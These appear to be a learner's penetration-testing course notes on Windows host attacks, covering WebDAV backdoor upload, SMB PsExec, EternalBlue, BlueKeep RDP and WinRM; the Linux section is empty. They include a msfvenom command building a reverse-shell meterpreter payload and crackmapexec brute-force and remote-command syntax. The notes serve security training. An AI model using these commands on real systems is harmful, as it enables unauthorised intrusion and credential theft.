# Host & Network Penetration Testing: System/Host Based Attacks

Intro: system/host based attacks are targeted towards a specific system or host running a specific os

## Windows

### Webdav
**Continue from previous webdav lessons...Uploading msf backdoor to WebDAV**
- msfvenom is to create payload `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > meterpreter.asp
- can also use `iis_webdav_upload` module in the framework instead of `cadaver` which is fully self contain

### SMB with PsExec

- before using psexec, valid credentials are needed, administrator account can be frute force
- brute force module name: `smb_login`
- The `smb/psexec` module in msf will very likely get caught but antivirus
- Manual exploit using psexec.py from impacket, install with `sudo apt install impacket-scripts`

### Eternal Blue MS17-010

What is shellcode?
Shellcode is a small piece of machine-level code (usually written in assembly) that an attacker uses as a payload — it's the code that gets executed once an exploit successfully gains control of a vulnerable process.

- Manual exploit available @ [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

how is shellcode related to MS17
1. The exploit causes a buffer overflow on a vulnerable system.
2. The attacker injects custom shellcode into memory as part of the payload.
3. Once the overflow occurs, the system executes the shellcode — giving you control.


### RDP

- The rdp_scanner module can varify if the port is running rdp
- After confirm, we can brute force the protocol

**BLUEKEEP (CVE-2019-0708)**

- An RDP vulnerability
- msf got both an auxiliary and exploit module for bluekeep (this module only work with 64bit windows, and also need to manually set target)
- Be EXTREMELY careful with kernel exploit, set CHUNK froom size smaller to be a bit gentle to the target machine

### WinRM

- not enabled by default need to be explicitly configured and enabled
- it allows sysadmin just provide username and userpassword/passwordhash to authenticate
- we can perform a bruteforce attack with "crackmapexec" syntax: `crackmapexec <protocol:winrm> <IP> -u <username:admin> -p <password list>
- to execute command with crackmapexec, syntax is: 'crackmapexec <protocol:winrm> <IP> -u <username> -p <password> -x <command to execute>
- to get command shell session we use "evil-winrm"
- msf also has a module: 'winrm_script_exec'
- TIPS: BY DEFAULT NMAP DOES NOT SCAN WINRM PORT 5985-5986

**Note: We are setting the PASSWORD because in the recent version of the "winrm_login" module, the PASSWORD option is required unless using Kerberos authentication. Metasploit will still use the USERPASS_FILE file.**

### Kernel Exploits & Priv Esc for windows

## Linux
